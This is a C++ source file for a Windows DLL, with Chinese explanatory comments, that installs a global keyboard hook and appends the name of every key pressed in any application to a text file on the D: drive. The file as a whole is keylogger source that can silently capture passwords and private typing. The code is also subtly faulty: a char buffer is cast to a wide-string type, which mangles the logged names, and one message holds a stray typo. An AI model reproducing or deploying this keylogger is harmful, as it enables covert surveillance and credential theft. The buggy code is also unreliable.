#include "pch.h" // use stdafx.h in Visual Studio 2017 and earlier
#include <utility>
#include <limits.h>
#include "MFCLibrary1.h"

// 项目的名称，注意这个项目的名称要和最后导出的DLL的文件名一致
#define PROJECT_NAME L"MFCLibrary1"

// 全局钩子
HHOOK g_hHook = NULL;
CComboBox* p;

/// <summary>
/// 键盘回调
/// </summary>
/// <param name="code"></param>
/// <param name="wParam">虚拟按键的代号</param>
/// <param name="lParam">键状态</param>
/// <returns></returns>
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
	if (code < 0 || code == HC_NOREMOVE) {
		// 如果代码小于零，则挂钩过程必须将消息传递给CallNextHookEx函数，而无需进一步处理，并且应返回CallNextHookEx返回的值。此参数可以是下列值之一。(来自官网手册)
		return CallNextHookEx(g_hHook, code, wParam, lParam);
	}
	if (lParam & 0x40000000) {
		// 【第30位的含义】键状态。如果在发送消息之前按下了键，则值为1。如果键被释放，则为0。(来自官网手册)
		// 我们只考虑被按下后松开的状态
		return CallNextHookEx(g_hHook, code, wParam, lParam);
	}
	char szKeyName[200];
	// 【参数1】LPARAM类型，代表键状态
	// 【参数2】缓冲区
	// 【参数3】缓冲区大小
	GetKeyNameText(lParam, (LPWSTR)szKeyName, 100);
	// 打开文件
	FILE* fp;
	errno_t err = fopen_s(&fp, "D:\\Hook_Keyboed.txt", "a+");
	if (err != 0) {
		// 文件打开失败，让钩子继续往下传
		return CallNextHookEx(g_hHook, code, wParam, lParam);
	}
	// 写入文件
	char szWriteText[100];
	// 改写字符串
	sprintf_s(szWriteText, "%s\n", szKeyName);
	fwrite(szWriteText, 1, strlen(szWriteText), fp);
	// 关闭文件
	fclose(fp);
	// 将钩子往下传
	return CallNextHookEx(g_hHook, code, wParam, lParam);
}

/// <summary>
/// 安装钩子
/// </summary>
/// <returns></returns>
BOOL InstallHook() {
	// 【参数1】钩子的类型，这里代表键盘钩子
	// 【参数2】钩子处理的函数
	// 【参数3】获取模块,PROJECT_NAME为DLL的项目名称
	// 【参数4】线程的ID，如果是全局钩子的话，这里要填0，如果是某个线程的钩子，那就需要写线程的ID
	g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, GetModuleHandle(PROJECT_NAME), 0);
	if (g_hHook == NULL) {
		// 钩子安装失败
		MessageBox(NULL, L"全局钩子注册失4败", L"信息", MB_OK);
		return FALSE;
	}
	return TRUE;
}

/// <summary>
/// 卸载钩子
/// </summary>
/// <returns>是否卸载成功</returns>
BOOL UninstallHook() {
	return UnhookWindowsHookEx(g_hHook);
}